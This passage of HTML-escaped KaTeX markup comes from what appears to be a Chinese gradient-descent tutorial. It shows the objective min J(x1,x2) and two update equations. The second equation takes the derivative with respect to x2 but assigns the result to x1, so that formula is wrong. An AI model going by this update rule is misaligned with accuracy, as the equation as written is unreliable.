mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0622159999999998em;vertical-align:-0.24810799999999997em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.24810799999999997em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.0622159999999998em;vertical-align:-0.24810799999999997em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.24810799999999997em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;的极小值，即目标为&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;minJ(x_1,x_2)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;α&lt;/mi&gt;&lt;mfrac&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mi&gt;α&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mspace linebreak=&#34;newline&#34;&gt;&lt;/mspace&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;α&lt;/mi&gt;&lt;mfrac&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mi&gt;α&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_1 = x_1 - \alpha \frac{d}{dx_1}J(x_1,x_2)=x_1-2\alpha x_1 \\
x_1 = x_1 - \alpha \frac{d}{dx_2}J(x_1,x_2)=x_1-2\alpha x_2
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.73333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20744em;vertical-align:-0.8360000000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;α&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.37144em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.73333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.79444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;α&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace newline&#34;&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.58056em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.73333em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20744em;vertical-align:-0.8360000000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;α&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.37144em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span 